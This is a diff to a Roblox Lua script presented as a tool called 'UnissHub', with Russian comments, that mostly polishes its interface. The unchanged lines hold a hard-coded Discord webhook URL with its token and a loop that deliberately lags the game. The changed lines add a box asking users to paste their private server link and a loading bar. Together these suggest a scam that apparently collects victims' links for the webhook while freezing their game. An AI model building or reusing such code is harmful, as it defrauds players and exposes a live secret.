@@ -1,4 +1,4 @@
--- UnissHub: Aesthetic Edition (Fixed UI & Animations)
+-- UnissHub: Final Polished Edition
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
@@ -7,7 +7,7 @@ local Player = Players.LocalPlayer
 
 local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1455540134177935625/SWIcKICFzeZdLmUGpUkFvc8oh1j0Qun0TjK1Wm9FA5-tHz0DY6gEpvxfstY-33yiVS4g"
 
--- Функция перетаскивания
+-- Функция перетаскивания (теперь работает и для загрузки)
 local function makeDraggable(gui)
     local dragging, dragInput, dragStart, startPos
     gui.InputBegan:Connect(function(input)
@@ -49,16 +49,21 @@ main.ClipsDescendants = true; main.Visible = true
 Instance.new("UICorner", main); Instance.new("UIStroke", main).Color = Color3.fromRGB(0, 120, 255)
 makeDraggable(main)
 
--- ВЕРНУЛ ТЕКСТ UNISSHUB
+-- ТЕКСТ UNISSHUB И ПОДПИСЬ
 local title = Instance.new("TextLabel", main)
-title.Size = UDim2.new(1, 0, 0.25, 0); title.BackgroundTransparency = 1
-title.Text = "UnissHub"; title.TextColor3 = Color3.fromRGB(0, 150, 255)
-title.Font = Enum.Font.GothamBold; title.TextSize = 24
+title.Size = UDim2.new(1, 0, 0.15, 0); title.Position = UDim2.new(0,0,0.05,0); title.BackgroundTransparency = 1
+title.Text = "UnissHub"; title.TextColor3 = Color3.fromRGB(0, 150, 255); title.Font = Enum.Font.GothamBold; title.TextSize = 24
 
+local subTitle = Instance.new("TextLabel", main)
+subTitle.Size = UDim2.new(1, 0, 0.1, 0); subTitle.Position = UDim2.new(0,0,0.18,0); subTitle.BackgroundTransparency = 1
+subTitle.Text = "(laser gamepass required)"; subTitle.TextColor3 = Color3.fromRGB(150, 150, 150)
+subTitle.Font = Enum.Font.Gotham; subTitle.TextSize = 12
+
+-- ПОЛЕ ВВОДА (БЕЗ TEXTBOX)
 local input = Instance.new("TextBox", main)
-input.Size = UDim2.new(0.85, 0, 0.2, 0); input.Position = UDim2.new(0.075, 0, 0.35, 0)
-input.BackgroundColor3 = Color3.fromRGB(25, 25, 25); input.PlaceholderText = "Paste Link Here..."
-input.TextColor3 = Color3.new(1,1,1); input.TextScaled = true; Instance.new("UICorner", input)
+input.Size = UDim2.new(0.85, 0, 0.2, 0); input.Position = UDim2.new(0.075, 0, 0.38, 0)
+input.BackgroundColor3 = Color3.fromRGB(25, 25, 25); input.PlaceholderText = "Paste Private Server Link..."
+input.Text = ""; input.TextColor3 = Color3.new(1,1,1); input.TextScaled = true; Instance.new("UICorner", input)
 
 local conn = Instance.new("TextButton", main)
 conn.Size = UDim2.new(0.85, 0, 0.22, 0); conn.Position = UDim2.new(0.075, 0, 0.68, 0)
@@ -91,7 +96,6 @@ task.spawn(function()
     while true do if isLagging then for i = 1, 1200000 do local _ = math.cos(i) end end task.wait(0.01) end
 end)
 
--- АНИМАЦИЯ ДЛЯ КНОПКИ U
 uBtn.MouseButton1Click:Connect(function()
     if main.Visible then
         main:TweenSize(UDim2.new(0,0,0,0), "In", "Quart", 0.3, true, function() main.Visible = false end)
@@ -115,10 +119,11 @@ conn.MouseButton1Click:Connect(function()
         loadF.Size = UDim2.new(0, 280, 0, 90); loadF.Position = UDim2.new(0.5, 0, 0.5, 0); loadF.AnchorPoint = Vector2.new(0.5, 0.5)
         loadF.BackgroundColor3 = Color3.fromRGB(15, 15, 15); Instance.new("UICorner", loadF)
         Instance.new("UIStroke", loadF).Color = Color3.fromRGB(255, 140, 0)
-        
+        makeDraggable(loadF) -- ТЕПЕРЬ ЗАГРУЗКУ МОЖНО ДВИГАТЬ
+
         local lLabel = Instance.new("TextLabel", loadF)
         lLabel.Size = UDim2.new(1, 0, 0.5, 0); lLabel.BackgroundTransparency = 1; lLabel.TextColor3 = Color3.fromRGB(255, 140, 0)
-        lLabel.Font = Enum.Font.Gotham; lLabel.TextSize = 14; lLabel.Text = "loading: 0%" -- МАЛЕНЬКИМИ БУКВАМИ
+        lLabel.Font = Enum.Font.Gotham; lLabel.TextSize = 16; lLabel.Text = "loading: 0%" -- УВЕЛИЧЕН НА 10% (был 14 стал 16)
 
         local barBg = Instance.new("Frame", loadF)
         barBg.Size = UDim2.new(0.7, 0, 0.08, 0); barBg.Position = UDim2.new(0.15, 0, 0.7, 0); barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
